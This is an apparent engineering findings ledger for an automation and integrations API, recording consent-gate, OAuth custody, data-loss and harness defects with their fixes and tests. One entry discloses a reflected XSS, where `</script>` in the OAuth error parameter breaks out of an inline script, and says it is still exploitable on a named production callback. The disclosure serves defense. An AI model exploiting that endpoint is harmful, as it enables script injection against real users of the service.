# Findings ledger

The live findings ledger: OPEN first, then recently fixed, then accepted/by-design. A finding closes
only by a landed fix + committed test, or a written dismissal. Replaces the release FINDINGS table and
the RUN_LOG finding tail. Journey findings keep their `F` ids; later findings use readable slugs.

## OPEN

- **`the-capability-surface-listed-google-workspace-and-could-never-execute-it`** (FIXED 2026-08-06,
  HIGH, public capability surface — found by driving the Garrison consumer to a REAL connected
  Google account rather than to a fixture). `POST /api/v1/integrations/:key/actions/:name/execute`
  answered `{"success": false, "code": "not_connected"}` for `google-workspace` on an org whose
  OAuth connection was live, enabled and refreshing — `GET /api/v1/platform-integrations/google`
  reported `connected: true` with the account email, and the stored row
  (`platform-<orgId>-google`) carried valid credentials the whole time.
  CAUSE: custody, not connection. `executeIntegrationCapabilityAction` called
  `executeUserIntegrationAction` and, by design, nothing else — that funnel resolves a PER-USER
  `integrationConfigs` row (`findConfigForOwner`) and there is none for a platform package, so it
  returned the coded refusal from `action-executor.ts:298`. The two shipped platform packages keep
  their tokens on an ORG-scoped row only `callPlatformIntegration` can read, and that function was
  wired into the composition root for the automation `integration` step and the trigger pipeline
  and NEVER onto the capability rail. `action-executor.ts:18-19` states the split plainly ("the
  function the automation engine's `integration` step calls for a NON-platform key … OAuth2/
  service_account are platform-only"); the capability route simply had no platform branch.
  So `GET /api/v1/integrations` listed `google-workspace` with all 24 actions, `GET
  /integrations/google-workspace` described them, the write gate correctly refused the mutating
  ones with a resolved destination — and not one of the 24 could ever run. The catalog advertised a
  rail that did not exist. Every existing case in
  `api/tests/integrations/integration-capability.test.ts` used a user-credential package, which is
  why nothing caught it; the contract suite probes admission, not custody.
  FIXED with a `callPlatform` SEAM on `CapabilityContext`, bound once in `server.ts` exactly like
  the existing `runAutomationBackedAction` and `draftAction` seams, and a custody dispatch in
  `executeIntegrationCapabilityAction` keyed on the new exported `isPlatformIntegrationKey`
  (platform-call.ts). The org comes from the verified principal and the acting user is forwarded so
  the platform write gate has an approval to look up.
  THE GATE DID NOT MOVE, which is the only reason the branch is allowed: `callPlatformIntegration`
  enforces its own gate over the same `action-consent.ts` primitives, in the one function every
  platform rail calls, and a mutating platform action with no live approval still answers
  `awaiting_consent` and still cannot be approved with a key (the approval route is `auth: 'user'`).
  A DIRECT import of the caller is refused by the static guard — the branch must go through the
  injected seam or the module regains its own credential path outside the composition root's
  control. With NO seam bound it fails closed rather than falling through to another custody.
  Pinned by three cases in `api/tests/integrations/integration-capability.test.ts` (the seam is
  used with the right tenancy; the static guard; fail-closed with no seam), reverted-and-verified
  red on two of them. VERIFIED LIVE end to end afterwards: `list_files` through the Garrison
  consumer returned 100 real Drive files, and `send_email_simple` still answered 403
  `awaiting_consent` naming `POST https://gmail.googleapis.com/gmail/v1/users/me/messages/send`.
  `api/tests/security` + `api/tests/contract` + `api/tests/integrations` are 1750/1750 green.
  RESIDUAL, FOUND AND CLOSED THE SAME DAY: the fix above moved the WRITE to platform custody and
  left the READ behind, so `getIntegrationCapability` still derived `connected` from the per-user
  config row (`config ? config.enabled !== false : def.authType === 'none'`) and reported
  `connected: false` for a live Google account whose actions now executed fine - the UI rendered
  "connected: false - actions will answer not_connected" directly above a successful call. That is
  the same D3 read/write disagreement this module's docblock already complains about, with the read
  the pessimistic one this time. Closed with a `platformConnected` seam bound from `platformStatus`
  (no token spent), pinned by a case asserting the catalog answers from the platform custody.

- **`a-parked-run-asked-a-question-no-external-client-could-read`** (FIXED 2026-08-06, MEDIUM,
  public capability surface / an endpoint whose auth class invites a caller who cannot use it -
  found while driving the Garrison consumer through the public surface end to end). A run that
  halts at `awaiting_consent` is answered with `POST /api/v1/automations/runs/:id/consent`, whose
  descriptor is `auth: 'user-or-key'` (`shared/src/automations.ts`, `consent`) and whose body
  REQUIRES `shape` (`ConsentRequest`, same file). The service refuses any shape other than the one
  the run is actually awaiting - deliberately, and that refusal is itself a security fix already
  recorded here (`consent-approval-scope-mismatch`, plus the "bank an approval for a shape the user
  was never shown" case pinned in `api/tests/automation/service.test.ts`). So the ONLY shape that
  works is the pending one, and the only carrier of it was the SSE `runAwaitingConsent` event
  (`api/src/automation/engine.ts:769`). There is no event stream on the key-reachable surface -
  `docs/openapi/cortex.v1.json` is generated from the `user-or-key` descriptors and contains none.
  `toWireRun` (`api/src/automation/service.ts`) projected `status` and never `consentRequest`.
  Net effect: a gateway key could read `status: "awaiting_consent"`, could not learn what was being
  asked, could not learn the shape, and therefore could not call the endpoint its own auth class
  invited it to call. The run was answerable only from a browser holding a live SSE subscription.
  This is the same gap the OPEN entry `no-wire-event-can-carry-a-pause-reason` names from the event
  side; this is its polling-side half, and unlike that one it is closable without a new event type.
  FIXED by publishing the pending question on the run record: `RunRecord.consentRequest`
  (`shared/src/automations.ts`, new `RunConsentRequest`) carries `{stepIndex, description, shape}`,
  `toWireRun` projects exactly those three, and `docs/openapi/cortex.v1.json` was regenerated
  (`api/scripts/generate-openapi.mjs`) so the drift gate stays green. ADDITIVE, so rule 7 applies:
  a new optional field on a `.passthrough()` schema; no existing response changed.
  THREE fields, not more: `argv` is the raw command line, which the engine shows a human only behind
  an explicit "what exactly will run?" toggle (`automation/types.ts:572`), and `approvalScope` is
  server-written bookkeeping its own type marks as never caller-supplied (`types.ts:586`). Neither
  becomes public as a side effect of making the gate answerable. Publishing the shape gives an
  attacker nothing the refusal above did not already constrain: `resolveConsent` still binds the
  answer to the run's own pending shape, and a caller who cannot read the run cannot read the shape.
  Pinned by `api/tests/automation/service.test.ts` - a case that reaches `awaiting_consent`, asserts
  the three fields (and the ABSENCE of `argv`/`approvalScope`), answers using ONLY the value the
  wire record published, and asserts the field is cleared once the run resumes so a finished run
  never advertises a stale question. Reverted-and-verified: with the projection removed the case
  fails on `expected undefined to match object`. `api/tests/contract` + `api/tests/automation` are
  844/844 green with it.
  NOT CLOSED BY THIS: the integration write gate on a DIRECT
  `POST /integrations/:key/actions/:name/execute` remains unanswerable by a key, and correctly so -
  it returns 403 with the `consentRequest` descriptor inline, but the approval endpoint
  (`POST /api/v1/integrations/:key/actions/:actionName/approval`) is `auth: 'user'` and off the
  key-reachable surface, so the approving human is a human by construction. Verified live against a
  real minted key: `send_email_simple` answers 403 `awaiting_consent` naming the RESOLVED target
  `POST https://gmail.googleapis.com/gmail/v1/users/me/messages/send` (no `{{placeholder}}` -
  independent live confirmation that `consent-target-shows-an-uninterpolated-template-and-config-can-redirect-it`
  is fixed), and the gate fires BEFORE the not-connected check, so it answers before a credential is
  touched.

- **`automations-create-dropped-every-step-field-it-could-not-carry`** (FIXED 2026-08-06, HIGH,
  public capability surface / contract honesty - the WIDENING half stays OPEN, at the end of this
  entry). `POST /api/v1/automations` and `PATCH /api/v1/automations/:id` are `user-or-key`
  (Capability Contract rule 4), and both stored their `plan.steps[]` through `mapWireStepToEngine`
  (`api/src/automation/service.ts`, was line 69), which built the engine `Step` from `{id,
  description, type}` and DISCARDED every other field on the wire step - while the contract's
  `PlanStep` (`shared/src/automations.ts:22-31`) is `.passthrough()` and therefore advertises the
  opposite. `toWireAutomation` (same file, ~line 74) then projected the stored step back as
  `{stepId, description, tool}`, so a client could not even SEE what had been lost.
  REPRODUCED LIVE against the running stack, with a key: a step
  `{"description":"List Gmail labels","tool":"integration","integrationKey":"google-workspace","integrationAction":"list_labels"}`
  was accepted **HTTP 201** and stored as
  `{"stepId":"step-0-1e98d8","description":"List Gmail labels","tool":"integration"}`; the run then
  died at execution with `integration step step-0-1e98d8 missing integrationKey or
  integrationAction` (`api/src/automation/engine.ts:1379`). The API discarded the fields the client
  had correctly supplied and then blamed the client at run time for their absence. SIX step types
  are in that position, each with its own run-time death: `integration` (integrationKey +
  integrationAction), `navigate` (url, engine.ts:1335), `sub_automation` (subAutomationId,
  engine.ts:1362), `local_command` (commandTemplate.argv,
  `api/src/automation/executors/local-command.ts:76`), `api_call` (apiRequest.method/.url,
  `executors/api-call.ts:155`), `ekoa_action` (ekoaAction.artifactSlug/.capabilityName,
  `executors/ekoa-action.ts:68`). A SECOND defect sat inside the same expression: an unrecognised
  `tool` was coerced to `'browser'` (`VALID_STEP_TYPES.has(s.tool) ? s.tool : 'browser'`), so the
  typo `brwoser` became a running browser step rather than an error.
  FIXED by refusing both at the door rather than storing a step that can only fail later. The
  uncarried parameters are now a named table (`STEP_TYPE_UNCARRIED_PARAMS`, service.ts:93) and the
  types this endpoint CAN express are derived from it, so the two lists cannot drift; a `tool` in the
  table and an unrecognised `tool` each throw `AutomationServiceError('VALIDATION', ...)`, which the
  router already maps onto the 400 `VALIDATION_FAILED` envelope (`routes/automations.ts`
  `sendServiceError` - this is that code's first use). The refusal message names the fields that
  cannot be expressed AND the route that can author them (`POST /api/v1/automations/plan`, then
  `POST /api/v1/automations/{id}/runs`); the claim was verified before it was written, in
  `automation/planner.ts` `normaliseStep` (sets integrationKey/integrationAction/argsTemplate) and
  `service.ts` `planFromGoal`, which persists those engine-native steps verbatim. The mapping is
  hoisted OUT of the `automations.update` callback in `patchAutomation` (service.ts:385) so a refused
  patch leaves the stored plan untouched instead of throwing mid-write, and out of the doc literal in
  `createAutomation` (service.ts:356) so nothing is minted before the refusal. An ABSENT `tool` still
  means `browser` - the contract marks the field optional and the wire view always emits one - so
  this refuses only input that was already guaranteed to fail (rule 7: nothing that worked stopped
  working). Pinned by `api/tests/automation/service.test.ts` (4 cases: create refused + nothing
  persisted, unrecognised tool not coerced, patch refused with the stored plan byte-identical, and
  the expressible types + absent-tool default still mapping) and
  `api/tests/contract/automations.test.ts` (2 cases through the real router: 400 + error envelope +
  the message naming `integrationKey, integrationAction` and `POST /api/v1/automations/plan`, and the
  refused automation absent from the following list). Reverted-and-verified: with the old mapper body
  restored, 5 of the 6 turn red and the compatibility guard stays green.
  **THE WIDENING QUESTION: ANSWERED 2026-08-06, NARROWLY.** `integration` now travels; nothing else
  does. The distinction is kind, not degree: an integration step can only name a package the RUN's
  own org already has, it resolves at execution under the run's principal like every other rail,
  and a mutating action still meets the write gate and returns `awaiting_consent` without a live
  approval - so the worst it expresses is a call the same caller could already make through
  `POST /integrations/:key/actions/:name/execute`. `commandTemplate`, `apiRequest`, `ekoaAction`,
  `subAutomationId` and `declaration` remain unauthorable, and their step types stay in the refusal
  table. `PlanStep` gains `integrationKey` / `integrationAction` / `argsTemplate` (shared/, additive
  under rule 7, OpenAPI + generated client regenerated); the service validates SHAPE only - a
  half-specified step is a 400 naming the missing field - and deliberately does NOT re-check which
  integration or whether the action may run, because the engine and the write gate already own both
  decisions and a second copy would drift. `toWireAutomation` projects the three fields BACK, which
  is the half that matters: returning only `{stepId, description, tool}` is what made the original
  loss invisible. Pinned by 4 new cases (service + contract) and verified LIVE with a real gateway
  key: authored, stored, read back on the wire, run `completed`.
  The historical record of the refusal follows.
  **THE ORIGINAL WIDENING QUESTION, AS IT STOOD.** Whether this endpoint should
  carry the parametrised step fields AT ALL is a security decision for the owner, not a bug fix. Engine
  `Step` (`api/src/automation/types.ts:258+`) also carries `commandTemplate` (a local command),
  `apiRequest` (an arbitrary outbound HTTP call), `ekoaAction`, `subAutomationId` and `declaration`
  (`StepDeclaration`, Cofre E-2 - which governs WHERE a step may run and which credential refs it may
  name). Passing those through from a key-auth surface would let any gateway-key holder author local
  commands and arbitrary HTTP calls: the same write rails `F-2026-08-03-ungated-write-rails` finished
  gating, reached from the authoring side instead. The narrow whitelist is containment, and widening it
  is not a mapper detail. CANDIDATE CLOSE: publish a NARROW per-type authoring shape in `shared/`
  covering `integration` only (integrationKey + integrationAction + argsTemplate, validated against the
  caller's own connected integrations through the existing catalog), and leave
  `local_command`/`api_call`/`ekoa_action`/`declaration` unauthorable on this surface - the two ends of
  that risk scale are not one decision. Related dangling promise to resolve in the same unit: `PlanStep`
  already declares `argv?: string[]`, which is parsed, never read by the mapper, and now sits on a step
  type (`local_command`) this endpoint refuses. Any of that changes `shared/` and the generated OpenAPI
  document, which is why it was not done here (review policy: the shared contract is cross-model-review
  scope).

- **`the-automation-editors-save-sends-steps-the-api-never-reads`** (OPEN 2026-08-06, HIGH, silent
  data loss in the product UI - found while fixing the entry above, NOT fixed here). The editor's
  Guardar calls the store with a TOP-LEVEL `steps`
  (`web/app/(dashboard)/automations/[id]/page.tsx:213` -> `update(current.id, { name, description,
  steps: draftSteps })`), the store forwards it as `api.automations.patch({ id, ...patch })`
  (`web/stores/automations.ts:238-250`), and `splitArgs` in `web/lib/api/core.ts` puts every
  non-path argument straight into the PATCH body. The server reads `patch.plan?.steps` and nothing
  else (`api/src/automation/service.ts` `patchAutomation`), and `AutomationPatch` is `.passthrough()`,
  so the key survives zod validation and is then ignored. TWO layers disagree, not one: the view step
  is `{id, description, type}` while the wire step is `{stepId, description, tool}`, so even a server
  that read the top-level key would be reading the wrong field names. NET EFFECT: editing a step and
  pressing Guardar changes nothing server-side, and because the store re-normalises the response into
  `current`, the edit visibly reverts. `create` carries the same mismatch
  (`web/stores/automations.ts:225-236` sends `steps`; `createAutomation` reads `input.plan?.steps`).
  NOT reproduced live - the running stack was off-limits for this unit, so the chain above is read
  from the code, and nothing in the suite contradicts it: neither `tests/drills/automations.spec.ts`
  nor `web/e2e/automation-deterministic.spec.ts` ever presses Guardar. WHY IT MATTERS FOR THE ENTRY
  ABOVE: the editor already authors the very fields the wire shape cannot carry - `step-card.tsx` +
  `integration-action-picker.tsx` let the user pick `integrationKey.actionName`, and
  `step-type-selector.tsx` offers all nine engine step types - so the widening question is not
  hypothetical: the UI has an authoring surface for it today and throws the result away on save.
  CANDIDATE CLOSE: normalise in the store's `create`/`update` (view steps -> `plan.steps` with
  `stepId`/`tool`), the mirror of the `normalizeWireAutomation` that already exists for the read
  direction, plus an e2e that edits a step description, saves, reloads and asserts the new text -
  BUT sequence it after the widening decision, because a faithful editor needs a wire shape that can
  carry an integration step, and until then the honest outcome for those types is the new 400.

- **`activate-page-shipped-untranslated-english`** (FIXED 2026-08-06, MEDIUM, i18n - Drill batch
  `01KZAP1CS3C3FYDYJ6T6ZS7MB9`). The CLI device-activation page (`/activate`) hardcoded every string
  in English ("Authorize this device", "No device code in the link...", "Only approve if you started
  this login...") while the rest of the product renders in pt-PT, so a user bounced here from the
  terminal login hit an untranslated page. FIXED by moving the copy into the locale contract
  (`pages.activate` in `web/locales/{types,pt,en}.ts`) and rendering it through `useTranslation()` in
  `web/app/activate/page.tsx`. The drill's e2e assertions and `tests/drills/activate.spec.ts` were
  moved to the pt-PT strings in the same unit, so `page-language-matches-app` and the text checks
  agree again.

- **`artifact-cards-rendered-literal-invalid-date`** (FIXED 2026-08-06, MEDIUM, data-integrity -
  same batch). Artifact cards printed the literal "Invalid Date" at rest whenever the API handed back
  a null/empty/malformed `createdAt`/`updatedAt`: `formatDate` and the detail-panel's direct
  `new Date(x).toLocaleDateString()` calls all formatted an Invalid Date straight to that string.
  FIXED in `web/components/artifacts/artifacts-surface.tsx` with a `toValidDate()` guard that returns
  null for an unparseable timestamp; `formatDate` now returns `string | null` and every call site
  omits the whole timestamp element rather than printing garbage - "a real formatted Portuguese date
  or the field omitted", per the drill.

- **`change-password-mismatch-rejection-read-as-a-defect-by-a-repair-step`** (DISMISSED 2026-08-06,
  discovery-run false positive, closed by a deterministic test + this dismissal). The batch reported
  that `/change-password` "changed the password rather than rejecting a mismatch", landing on
  `/login`. The page was always correct: `canSubmit` requires `newPassword === confirmPassword`, the
  submit is `disabled` on mismatch, `handleSubmit` early-returns on `!canSubmit`, and the confirm
  field shows "As palavras-passe não coincidem" inline. What the vision judge photographed was the
  run's OWN repair step re-typing a matching confirmation and submitting - the harness acting, not
  the page accepting a mismatch. Closed by graduating the step from vision to a deterministic e2e
  spec (`tests/drills/change-password.spec.ts#mismatch-rejected`) that asserts the inline error is
  shown, the submit stays disabled, and no success banner appears. LESSON: a vision step whose
  "success" only appears after an auto-repair typed the passing input is testing the harness, not the
  product - graduate it to a spec that pins the pre-repair state.
- **`microsoft-connect-never-showed-an-account-picker`** (FIXED 2026-08-06, HIGH, a connect that
  binds the workspace to an account the user never chose - and cannot undo from the product).
  `microsoftAuthUrl` (`api/src/integrations/platform-oauth.ts`) sent no `prompt` parameter, while
  its Google sibling three functions above sends `prompt: 'select_account consent'`. Without it the
  Microsoft identity platform reuses whatever account the browser is already signed into and
  returns straight to the callback: the operator clicks "Ligar", a window flashes, and the page
  says "Ligação concluída" having asked nothing. Observed live on staging - a PERSONAL (MSA)
  account got bound this way, and it reports healthy on every surface we have while `/v1.0/sites`
  answers `not supported for MSA accounts`, i.e. the SharePoint capability the plane exists for
  cannot run (see `workspace-microsoft-connected-as-a-personal-account-cannot-reach-sharepoint`).
  WHY IT IS WORSE THAN A MISCLICK: there is no in-product recovery. Disconnecting drops OUR row but
  not Microsoft's browser session, so the next connect silently rebinds the same wrong account, and
  the operator has no affordance anywhere to choose a different one. The only escape was signing
  out of Microsoft in the browser.
  FIXED: `prompt: 'select_account'` on the Microsoft authorize URL - `select_account` alone rather
  than Google's pair, because Microsoft documents `prompt` as a SINGLE value
  (login|none|consent|select_account) and re-prompts consent by itself for a new account or scope
  set. Pinned by `api/tests/integrations/platform.test.ts`, which now asserts the picker parameter
  for BOTH providers in one test (the asymmetry is the bug, so the assertion is symmetric) plus
  that Microsoft still requests `offline_access` and `Sites.ReadWrite.All`.

- **`workspace-microsoft-connected-as-a-personal-account-cannot-reach-sharepoint`** (OPEN
  2026-08-06, MEDIUM, configuration + a swallowed failure the product should surface). On staging
  the workspace Microsoft connect completed and every platform-side signal says connected:
  `/api/v1/platform-integrations/microsoft` -> `{connected:true}`, `/api/app-cloud-files/status` ->
  `microsoft.connected:true`, and a real Graph call through the served-app proxy returns real data
  (`GET /api/m365/v1.0/me/drive` -> a live OneDrive). The workspace-credential seam is therefore
  working end to end. But the account that was connected is a PERSONAL Microsoft account (MSA), and
  SharePoint is an organizational-tenant API: `GET /v1.0/sites?search=...` and `GET /v1.0/organization`
  both answer `BadRequest: This API is not supported for MSA accounts`. So the SALOMAO ERP's
  `provisionClientSharePoint` - which does `/sites?search=Ekoa AI` and then PUTs the client folder
  tree into that site's drive - cannot work with this connection, while the dashboard shows the
  integration as healthy.
  TWO THINGS MAKE THIS WORSE THAN A WRONG CLICK. (1) `MICROSOFT_TENANT_ID=common` admits both
  account types, so nothing at consent time distinguishes the account that can do the job from the
  one that cannot; ekoa-dev's exchange decoded the id_token `tid` claim (`9188040d-...` = MSA)
  precisely so an org-only feature could tell them apart, and that discrimination was not ported.
  (2) The ERP swallows the failure: its SharePoint provisioning is deliberately best-effort so the
  conversion cascade never blocks, which means a user sees the client convert successfully and
  simply never gets folders, with no error anywhere.
  FIX (operator): connect the WORK/SCHOOL account of the tenant that owns the SharePoint site
  (prod used `ekoaai.sharepoint.com`), not a personal one. FIX (product, unported): record the
  account type at connect and either refuse or warn when an org-only capability is enabled against
  an MSA connection - a status that says "connected" while the only feature it exists for cannot
  run is the honest-degrade rule broken.

- **`zoho-callback-page-script-injection`** (FIXED-HERE 2026-08-06, HIGH, **live in ekoa-dev /
  api.ekoa.io** - not a defect of this repo, a defect this repo refused to inherit). The Zoho OAuth
  callback renders a server-built HTML page that hands the outcome to the opener via
  `postMessage`, embedding the values with `JSON.stringify` inside an inline `<script>`.
  `JSON.stringify` does not escape `/`, so a value containing a literal `</script>` CLOSES the
  script element during HTML parsing and everything after it is parsed as markup. The injected
  value on that page is the OAuth error string, which is reflected straight from Zoho's own
  `?error=` query parameter on an **unauthenticated** route - so a crafted link is reflected XSS on
  the API origin, with no state, no login and no interaction beyond the click. Same shape in the
  human-readable message line.
  In the port, `jsonForScript()` escapes `<`, `>`, `&` and U+2028/U+2029 before embedding, and the
  fallback link is attribute-escaped; the payload still arrives intact, just inert. Pinned by
  `api/tests/integrations/zoho-oauth.test.ts`, which asserts the page still contains exactly one
  `<script>`/`</script>` pair after an injection attempt. Found BY writing that test - upstream has
  no test of this route at all, which is also how its credential-clearing regression reached a
  customer.
  ACTION FOR THE OPERATOR: this is exploitable in production today at
  `https://api.ekoa.io/api/v1/oauth/zoho/callback?error=...`. The same `buildOAuthResultPage` is
  shared by the ADOBE callback, so both providers are affected. Fix is the four-line escape above,
  in `cortex/src/server.ts buildOAuthResultPage`.

- **`import-ignores-the-bundle-slug`** (OPEN 2026-08-06, LOW, contract inconsistency). The shared
  `ArtifactBundle` declares an optional `slug`, and `convert-dev-bundle.mjs` sets it from `--slug`,
  but `importArtifact` calls `generateSlug(name, deps)` and never reads `bundle.slug`. Importing
  `legal-case-manager-3` therefore produced `erp-juridico-brasil-salomao` (derived from the app's
  display name) with no warning. Harmless here - the served URL is cosmetic and app-data is keyed on
  the canonical id, not the slug - but a field the schema advertises and the importer silently drops
  is the same class of defect as the two manifest bugs fixed this week. FIX WHEN TOUCHED: honour
  `bundle.slug` when it is free, fall back to the generated one when taken, and say which happened.

- **`artifact-import-could-not-accept-a-real-app`** (FIXED 2026-08-06, HIGH, the import endpoint
  did not work for its own purpose). `POST /api/v1/artifacts/import` sat behind the app-wide 1 MB
  `express.json()`, and a real app export is bigger than that: the production
  `legal-case-manager-3` bundle is **1.34 MB of source alone**, before any app-data dump, and
  prod's own exporter admits files up to 1.5 MB EACH. So the endpoint whose entire job is
  importing real apps could only ever accept toy ones, and the first genuine import answered
  `413 PAYLOAD_TOO_LARGE`. `POST /:id/bundle-update` - the path prod patches are pushed through -
  had exactly the same ceiling.
  FIXED with the LLM gateway's established pattern, both halves: the two bundle routes mount their
  own parser (`bundleJson`, 25 MB, `EKOA_ARTIFACT_BUNDLE_MAX_SIZE`) AND `server.ts` exempts those
  paths from the global parser - without the exemption the global one consumes the body first and
  the router limit is dead code, which is the trap the gateway hit in run 20260717. The exemption
  is pinned at both ends (`/import` exact; `/:id/bundle-update` with the id charset between fixed
  segments) so no sibling route widens. Suite: `api/tests/contract/malformed-json.test.ts` asserts
  a 1.4 MB body reaches auth on both bundle routes (401, never 413) and that two neighbours -
  `POST /artifacts` and `/bundle-update/extra` - still cap at 1 MB.
  WHY IT WAS NEVER CAUGHT: every fixture bundle was small. The size limit is not a property any
  hand-written test bundle exercises, and the operator-run import driver skips cleanly without a
  real export - so the first real payload was the first test.

- **`prod-export-manifest-never-reached-the-import`** (FIXED 2026-08-06, HIGH, silent capability
  loss on every prod import). The first real export of `legal-case-manager-3` from api.ekoa.io
  carried 26 scaffold files and **no `manifest.json` among them** - prod keeps that information in
  the envelope's separate `manifest` FIELD, which it assembles from its own defaults overlaid with
  the on-disk file. `convert-dev-bundle.mjs` read only `id`/`name`/`version` off that field and
  dropped the rest, and ekoa-code's importer reads what an app declares from a manifest FILE. Net
  effect: the ERP would have imported with a DEFAULT manifest - no `backend: {handlers:['onEmail']}`,
  no `extends: 'app-auth-persistent'` - and would have built, served its UI, and silently never
  processed an email. Nothing would have failed; the feature would simply not exist.
  FIXED: the converter now always writes `manifest.json` into `bundle.files` from the envelope's
  manifest field, filling the build fields a sparse prod manifest omits, and the envelope's copy
  WINS over a stale scaffold copy of the same path (never both). Suite: the manifest-fidelity block
  in `api/tests/migration/convert-dev-bundle.test.ts`, including a case asserting the reconstructed
  manifest passes ekoa-code's own `validateManifest`.
  CAUGHT BY a warning deliberately put in the one-shot operator import script rather than by a test
  - the two formats had been "equivalent" in every fixture written by hand, because every fixture
  author put a manifest.json in the scaffold. The real export did not. Related and landed the same
  day: `ensureManifest` now REFUSES an invalid manifest instead of defaulting past it.

- **`m365proxy-manifest-flag-stripped`** (FIXED 2026-08-05, HIGH, dead opt-in - the workspace
  Microsoft plane could never be reached by any app). The Q-10 gate on `/api/m365/*`
  (`api/src/integrations/m365-proxy.ts`) requires a per-app manifest opt-in, and `server.ts`'s
  `resolveAppScope` reads it: `m365Proxy: (reg?.manifest as {m365Proxy?: boolean})?.m365Proxy === true`.
  But `validateManifest` (`api/src/apps/manifest.ts`) returns a WHITELIST of named keys, and
  `m365Proxy` was not among them - so the registry's manifest never carried the flag no matter what
  the author wrote in `manifest.json`, `resolveAppScope` always computed `false`, and every request
  to the workspace Graph proxy answered `403 App has not enabled the Microsoft 365 workspace proxy`.
  Two independent gates (served + opt-in) read as one that can never open. It went unnoticed because
  the plane's other half was ALSO stubbed (see the next finding): with the token seam throwing
  not-connected, a 403 and a 502 both looked like "not wired yet".
  FIXED: `m365Proxy?: boolean` declared on `AppManifest`, validated as a boolean (a truthy STRING is
  refused, never coerced into an opt-in), and carried through the return. Pinned by
  `api/tests/apps/manifest.test.ts`, which asserts both halves of the whitelist property - the
  declared flags survive a write→read round-trip, an undeclared key still does not.
  LESSON: a whitelist validator between an author and a consumer is a silent-drop machine. Any
  manifest key a gate reads needs a test that carries it end to end, not a type declaration.

- **`workspace-graph-token-was-a-permanent-not-connected-stub`** (FIXED 2026-08-05, HIGH,
  unimplemented plane presented as a wired one). `server.ts` passed `workspaceNotConnected(...)` as
  `getWorkspaceGraphToken` for `/api/m365/*` and as `workspaceCloudFiles.getAccessToken` for
  `/api/app-cloud-files/*`: both planes were mounted, documented, gated and tested, and could not
  reach Microsoft Graph at all. Honest (502 / 409, never a fake success) but permanently inert, so
  the SharePoint provisioning the SALOMAO ERP performs through `/api/m365/v1.0/sites/...` had no
  server-side path.
  FIXED by `api/src/integrations/workspace-credential.ts`: the workspace of a served app is the ORG
  OF ITS OWNER - platform-OAuth rows are org-scoped (`platform-<orgId>-<provider>`) - so the token is
  resolved per request from the app scope the router already admitted, refreshed behind the seam,
  and never ambient. Fails closed on an empty/unknown/org-less owner (no provider traffic at all on
  behalf of a non-tenant) and keeps the `not connected` / `reconnect required` degrade contract both
  routers already mapped. Suites: `api/tests/integrations/workspace-credential.test.ts` (tenancy,
  refresh, dead-token reauth, no token in an error message) and the extended
  `api/tests/contract/app-sso.test.ts`, which pins that the owner spent is the ADMITTED app's - not
  the header, not the caller's JWT - and that a refused gate never reaches the seam at all.
  STILL OPEN alongside it: the docx link/cloud ingest keeps the not-connected stub, because a build's
  tool call carries an appId but no owner down to `agents/seams.ts fetchFromCloud`; threading the
  run's owner through is tracked in `docs/dev-parity.md`.

- **`a-partial-credential-save-replaced-the-whole-bundle`** (FIXED 2026-08-05, HIGH, silent
  destruction of a stored secret). `updateConfig` (`api/src/integrations/service.ts`) encrypted
  `patch.configValues` verbatim as the new bundle, so a save carried away every field it did not
  include. A credential form only sends what was typed in that browser session - a masked field the
  user did not retype comes back as `''`, a field the form does not render does not come back at
  all - so re-pasting a Zoho `client_id`/`client_secret` erased the permanent `refresh_token`. In the
  old platform that exact sequence took Brasil Salomão's e-signature down (ekoa-dev `ca446cb0`,
  2026-07-28); this repo carried the same shape, untriggered only because nobody had re-saved a
  credential yet. Two further consequences rode along: the WS-C shadow and the non-secret
  `publicConfigValues` projection were both computed from the patch, so a partial save shrank the
  Rule-10 comparator's shadow and could drop a destination field a standing approval was bound to.
  FIXED: `mergeCredentialValues` - absent keys, `null`/`undefined`, and empty/whitespace strings all
  leave the stored value alone; only the explicit `CLEAR_CREDENTIAL` sentinel deletes a key. The
  ciphertext, the shadow and the projection are all computed from the MERGED bundle. An undecryptable
  stored blob now RETURNS `undecryptable` (route: 422 `SECRET_GUARD_BLOCKED`, telling the user to
  re-enter every credential) instead of merging blind - degrading to `{}` there would have turned a
  rotated encryption key into a full wipe on the very next save. Suite:
  `api/tests/integrations/credential-merge.test.ts` reproduces the Zoho incident directly.
  NOT a new error code on purpose: the shared `ErrorCode` enum is a client contract, and adding a
  member makes older clients read the body as "not the shared error envelope".

- **`chokepoint-gate-case-test-failed-on-a-case-insensitive-filesystem`** (FIXED 2026-08-05, LOW,
  harness-not-product). `tests/security/grep-gates.test.ts` planted `api/src/LLM/p.ts` in a sandbox
  that pre-creates `api/src/llm`, and asserted the gate refuses it. On macOS APFS the `mkdir` is a
  no-op and the file lands in the exempt directory, so the gate correctly reported clean and the
  test failed - on every local full-suite run, for months, on the harness rather than on the gate.
  FIXED by probing the sandbox filesystem once and skipping exactly that case when it cannot be
  posed (CI on Linux still runs it), with the always-true half - the real `llm/` paths ARE exempt -
  split into its own test that runs everywhere. Found while running the suite for an unrelated
  change; see also the ledger-census drift below - two gates rotted the same way.

- **`client-drift-gate-red-on-a-stale-node_modules`** (FIXED 2026-08-05, LOW, environment).
  `npm run gate:client-drift` - which sits in `ci:lane` BEFORE `typecheck`/`test`/`build`, so its
  failure hides everything after it - died with `ERR_MODULE_NOT_FOUND: openapi-typescript` on a
  clean tree. The package is correctly declared in `clients/cortex-cli/package.json`; the local
  `node_modules` had simply drifted from the lock file. `npm install` fixed it with NO lock-file
  change, and the gate reports clean. Worth knowing because the failure mode reads like client
  drift and is not: an `ERR_MODULE_NOT_FOUND` from a gate means the gate did not run.

- **`suite-ledger-unit-census-drifted-red`** (FIXED 2026-08-05, LOW, gate rot). `npm run gate:ledger`
  had been failing its frontend-unit count census (disk 50 vs ledger 49) since commit `105e10b`,
  which landed `web/__tests__/integration-user-scoped-skill.test.ts` without its `SUITE_LEDGER.json`
  row. Registered, with the reason recorded in the ledger's own `census_note` (the same class of
  omission that note already records three times). Found during an unrelated parity run - the census
  is only load-bearing if somebody runs it.

- **`the-dev-harness-proxy-never-propagated-client-disconnects`** (FIXED 2026-08-05, MEDIUM,
  dev-harness resource leak - and the root of a whole false defect report). `driver.mjs up`
  occupies `backend.port` (4111) with a small CORS reverse proxy and runs the real API on 4211.
  Its forward path did `proxyRes.pipe(res)` and nothing else: `pipe` forwards DATA, never
  TEARDOWN, so when a browser closed an SSE stream the proxy's upstream request to the API stayed
  open forever. The API never saw the disconnect, so `res.on('close')` never fired, its
  `SseManager` client was never deleted, and its 30s keepalive timer went on writing into a dead
  socket for the life of the process. `/health`'s `bridgeConnections` therefore only ever climbed:
